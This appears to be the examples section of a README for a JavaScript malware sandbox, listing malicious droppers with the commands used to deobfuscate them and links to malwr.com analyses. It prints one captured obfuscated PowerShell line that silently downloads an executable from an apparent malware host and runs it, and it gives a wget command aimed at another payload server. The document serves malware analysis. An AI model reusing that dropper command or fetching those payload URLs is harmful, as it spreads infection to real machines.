# Examples #

## BILL_553.js ##

This one does not run from within a browser, therefore we run with wscript-only config. After deobfuscation the payload is being downloaded with a PowerShell command:

    19 Oct 23:02:17 -  => Executing: malware/20161019/7698627e91bd2db3853b9604b710df43deadea9883ae97468a53d20a9601f2d1.js
    19 Oct 23:02:17 - ActiveXObject(WScript.Shell)
    19 Oct 23:02:17 - Created: WScript.Shell[1]
    19 Oct 23:02:17 - WScript.Shell[1].Run(cmD.exe /c pOWersh^e^Ll.^eXe^   -exe^c^Uti^oN^pO^lic^Y    ^bYpaSs^   
        -n^OPRo^fIle^  -w^IN^D^Ows^Ty^Le  h^IDDen  (^neW-Obj^ec^T S^y^St^e^M^.ne^T.^we^Bc^L^ieNt)^.DoW^N^Loa^dFi^le('http://www.cambridgeok.top/user.php?f=1.dat','%apPdaTa%.eXe');
        ^S^Tart-Pro^ce^ss^ %aPPdata%.eXe, 0, undefined)

**malwr.com:** https://malwr.com/analysis/MGVhMGRjMDNiZDcxNDI5Yzk4NTIxZGYwZTNjZDY0NTk/

**Source code:** malware/20161019/7698627e91bd2db3853b9604b710df43deadea9883ae97468a53d20a9601f2d1.js

**Command:**

    node jailme.js --down=y -c ./config_wscript_only.json malware/20161019/7698627e91bd2db3853b9604b710df43deadea9883ae97468a53d20a9601f2d1.js

**Output:** [malware/20161019/7698627e91bd2db3853b9604b710df43deadea9883ae97468a53d20a9601f2d1.out](malware/20161019/7698627e91bd2db3853b9604b710df43deadea9883ae97468a53d20a9601f2d1.out)


## doc-details_TLQdGH.js ##

Two stages of javascript. Uses Sleep to delay execution. 

**malwr.com:** https://malwr.com/analysis/ZGQyNWQ3OGZjYTg2NGJkNzgwOWJhOWZkNzg1MzJkOTM/

**Source code 1st stage:** malware/20161013/802577e503bd1880e57b3bd3d3ed047d90a0f0aa0dee89a04a90944fc1f74f27.js
**Source code 2nd stage:** malware/20161013/_TMP__XipXkrLd.js

**Commands:**

    node jailme.js malware/20161013/802577e503bd1880e57b3bd3d3ed047d90a0f0aa0dee89a04a90944fc1f74f27.js
    cp output/_TMP__XipXkrLd.js malware/20161013/
    node jailme.js malware/20161013/_TMP__XipXkrLd.js

**Output 1st stage:** [malware/20161013/802577e503bd1880e57b3bd3d3ed047d90a0f0aa0dee89a04a90944fc1f74f27.out](malware/20161013/802577e503bd1880e57b3bd3d3ed047d90a0f0aa0dee89a04a90944fc1f74f27.out)
**Output 2nd stage:** [malware/20161013/_TMP__XipXkrLd.out](malware/20161013/_TMP__XipXkrLd.out)

## firefox-patch.js ##

This one is downloading the **2nd javascript stage** from a remote server. Quite rare. Unfortunatelly the remote server is no
longer returning the payload.

Note the SyntaxError is beacause the server does not return a valid payload anymore:

    8 Oct 20:53:44 - MSXML2.XMLHTTP[9].ResponseText.get() => (string) '<html>??<head><title>404 Not Found</title></head>??<body bgcolor="white">??<center><h1>404 Not Found ... (truncated)'
    8 Oct 20:53:44 - Strict mode: false
    8 Oct 20:53:44 - Calling eval() no.: 3
    8 Oct 20:53:44 - Exception occured: object SyntaxError: Invalid or unexpected token
        at eval (env/eval.js:24:12)
            at eval (eval at eval (env/eval.js:24:12), <anonymous>:1:2178)

**malwr.com:** https://malwr.com/analysis/NTkwMTFiYTZkODdlNDI4ZThjOGZiYTBlNWM1YzczMWU/

**Source code:** malware/20161008/140da02684fd276b6c989317c8ba13f066373dc2623153776da5b8a3e4c7a59f.js

**Command:**

    node jailme.js --down=y malware/20161008/140da02684fd276b6c989317c8ba13f066373dc2623153776da5b8a3e4c7a59f.js

**Output:** [malware/20161008/140da02684fd276b6c989317c8ba13f066373dc2623153776da5b8a3e4c7a59f.out](malware/20161008/140da02684fd276b6c989317c8ba13f066373dc2623153776da5b8a3e4c7a59f.out)

## factuur_897239.js ##

Here we are unable to download the payload as the remote server uses 301 HTTP response, which is not handled by the 
underlying XMLHTTPRequest in sync mode. Alhough deobfuscation runs just fine, so you can download the payload manually.

**malwr.com:** https://malwr.com/analysis/MTdhMjkxZDRlMzRmNDEzM2JiYTllMDBjNzkxYTQxYWU/

**Source code:** malware/20161007/3c1ab04d15fdc84afbf819df546359c8df9a8c303c67c90ce28a4417d9039393.js

**Command:**

    node jailme.js --down=y malware/20161007/3c1ab04d15fdc84afbf819df546359c8df9a8c303c67c90ce28a4417d9039393.js

**Output:** [malware/20161007/3c1ab04d15fdc84afbf819df546359c8df9a8c303c67c90ce28a4417d9039393.out](malware/20161007/3c1ab04d15fdc84afbf819df546359c8df9a8c303c67c90ce28a4417d9039393.out)


## malware.js ##

Pretending to be a game. Interesting deobfuscation procedure. 

**malwr.com:** https://malwr.com/analysis/OTE3MDcwOGVhZjc3NDA0ZmFjNTk0ZjljMDc4NGM2YjQ/

**Source code:** malware/20161005/dbf6e041cf2431018b977f734db844a2d731dd25cc3debabbfcfa8c529ce2a77.js

**Command:**

    node jailme.js --down=y malware/20161005/dbf6e041cf2431018b977f734db844a2d731dd25cc3debabbfcfa8c529ce2a77.js

**Output:** [malware/20161005/dbf6e041cf2431018b977f734db844a2d731dd25cc3debabbfcfa8c529ce2a77.out](malware/20161005/dbf6e041cf2431018b977f734db844a2d731dd25cc3debabbfcfa8c529ce2a77.out)

## USBPRO1.JS ##

Using ScriptControl to deobfuscate an hexa array into a VBScript code.

**malwr.com:** https://malwr.com/analysis/NWFjMGY0OWVhZDIzNDA3Y2I4OGIwOTFlZGIwYWY4ZGY/

**Source code:** malware/20161003/86943c7e77aac9a3db09def4cdd038f7707fde04d8af59245463dceef5cccc51.js

**Command:**

    node jailme.js malware/20161003/86943c7e77aac9a3db09def4cdd038f7707fde04d8af59245463dceef5cccc51.js

**Output:** [malware/20161003/86943c7e77aac9a3db09def4cdd038f7707fde04d8af59245463dceef5cccc51.out](malware/20161003/86943c7e77aac9a3db09def4cdd038f7707fde04d8af59245463dceef5cccc51.out)

## ORDER-12874.js ##

This one is a strange one. 

I had to modify the malware and increase deobfuscating XOR key named 'XHZGH' by 2 
to make the deobfuscation work. Maybe it targets German systems only, where "TypeError" translates to "Eingabefehler" and 
'e' = ASCII 101 is less then 'g' = ASCII 103 exactly by 2.  

Compare the **original** and **modified** version of the malware. 

Also the payload finally downloaded has 0 length. Maybe the server uses IP geolocations. I cannot verify as I'm not in Germany.
Anybody from Germany may try:

    wget -d --header="User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko" http://instalseds.bid/admin.php?f=403


**malwr.com:** https://malwr.com/analysis/Y2NjN2I4NTlkZjIyNDFkYzljZDZkNDY3OWIzMmRlYjY/

**Source code original:** malware/20161002/ac5705ba4eeb9295b162073cdccf64b9a0a14fd3bf933694e083aab2e65820e9.js.orig

**Source code modified:** malware/20161002/ac5705ba4eeb9295b162073cdccf64b9a0a14fd3bf933694e083aab2e65820e9.js

**Command:** 

     node jailme.js --down=y malware/20161002/ac5705ba4eeb9295b162073cdccf64b9a0a14fd3bf933694e083aab2e65820e9.js

**Output:** [malware/20161002/ac5705ba4eeb9295b162073cdccf64b9a0a14fd3bf933694e083aab2e65820e9.out](malware/20161002/ac5705ba4eeb9295b162073cdccf64b9a0a14fd3bf933694e083aab2e65820e9.out)


## Norri.js ##

**malwr.com:** https://malwr.com/analysis/Mjc0ZjUyMjZhYzg4NDJlYmEwNzBkMTAxODA5NGYwZGM/

**Source code:** malware/20160929/cb7fc381f6f7600ca0060764ae117482cae3a0fa02db4467604a55c57d069124.js

**Command:** 

     node jailme.js --down=y malware/20160929/cb7fc381f6f7600ca0060764ae117482cae3a0fa02db4467604a55c57d069124.js

**Output:** [malware/20160929/cb7fc381f6f7600ca0060764ae117482cae3a0fa02db4467604a55c57d069124.out](malware/20160929/cb7fc381f6f7600ca0060764ae117482cae3a0fa02db4467604a55c57d069124.out)

## ORDER-10455.js ##

This one has very long and nice deobfuscation. Same like ORDER-19586.js

**malwr.com:** https://malwr.com/analysis/NDU1ZDA4NmY3ZGUyNDczZjg0ODU2OGZiZTMxNjA5NzE/

**Source code:** malware/20160929/416e32e1b22ecb8f360ff841b87d77ac9450fda24458ce4e70abb35ff4d242a3.js

**Command:** 

     node jailme.js --down=y malware/20160929/416e32e1b22ecb8f360ff841b87d77ac9450fda24458ce4e70abb35ff4d242a3.js

**Output:** [malware/20160929/416e32e1b22ecb8f360ff841b87d77ac9450fda24458ce4e70abb35ff4d242a3.out](malware/20160929/416e32e1b22ecb8f360ff841b87d77ac9450fda24458ce4e70abb35ff4d242a3.out)

## N750991284.js ##

**malwr.com:** https://malwr.com/analysis/MzdlYThhNGE0NTZkNGRiMjg4MmE0ZTFmZjMyNTQyYzg/

**Source code:** malware/20161001/f51943c5860e548138991b991abecaa175353c80ab3ea91b3d1fbb5a4feb42f4.js

**Command:**

    node jailme.js --down=y malware/20161001/f51943c5860e548138991b991abecaa175353c80ab3ea91b3d1fbb5a4feb42f4.js
    
**Output:** [malware/20161001/f51943c5860e548138991b991abecaa175353c80ab3ea91b3d1fbb5a4feb42f4.js](malware/20161001/f51943c5860e548138991b991abecaa175353c80ab3ea91b3d1fbb5a4feb42f4.js)

## Wileen.js ##

**malwr.com:** https://malwr.com/analysis/NTVkZDQ4MGZkZWE4NDAyM2EwODEyMDM3MDhjMDI1MTQ/

**Source code:** malware/20161001/a6dfd6b83d46702c0b408bd5f669e08c785cd12fdd515fe469595e2a3d44ddc4.js

**Command:**

    node jailme.js --down=y -c ./config_wscript_only.json  malware/20161001/a6dfd6b83d46702c0b408bd5f669e08c785cd12fdd515fe469595e2a3d44ddc4.js
    
**Output:** [malware/20161001/a6dfd6b83d46702c0b408bd5f669e08c785cd12fdd515fe469595e2a3d44ddc4.out](malware/20161001/a6dfd6b83d46702c0b408bd5f669e08c785cd12fdd515fe469595e2a3d44ddc4.out)

## ORDER-19586.js ##

This one has very long and nice deobfuscation.

**malwr.com:** https://malwr.com/analysis/YmQ1Y2M1YjAxNGY0NGRlNjllODI4N2Y0MGYzYmI3ZGM/

**Source code:** malware/20161001/cfb2d04891156bffb08ad15188f9dbbd9e7379b0a571fd50128116904873e238.js

**Command:**

    node jailme.js --down=y malware/20161001/cfb2d04891156bffb08ad15188f9dbbd9e7379b0a571fd50128116904873e238.js

**Output:** [malware/20161001/cfb2d04891156bffb08ad15188f9dbbd9e7379b0a571fd50128116904873e238.out](malware/20161001/cfb2d04891156bffb08ad15188f9dbbd9e7379b0a571fd50128116904873e238.out)

## signed doc 5194.js ##

**malwr.com:** https://malwr.com/analysis/ZTA4ZDk5MDNiN2VjNDk4ZDgwOTU4NDBmYTAxZDVmOWI/

**Source code:** malware/20160531/8d1c45e37b97fcd061f52a5d7ab73476ab80520df58514eb7e091852d2d43b04.js

**Command:**

     node jailme.js --down=y malware/20160531/8d1c45e37b97fcd061f52a5d7ab73476ab80520df58514eb7e091852d2d43b04.js

**Output:** [malware/20160531/8d1c45e37b97fcd061f52a5d7ab73476ab80520df58514eb7e091852d2d43b04.out](malware/20160531/8d1c45e37b97fcd061f52a5d7ab73476ab80520df58514eb7e091852d2d43b04.out)
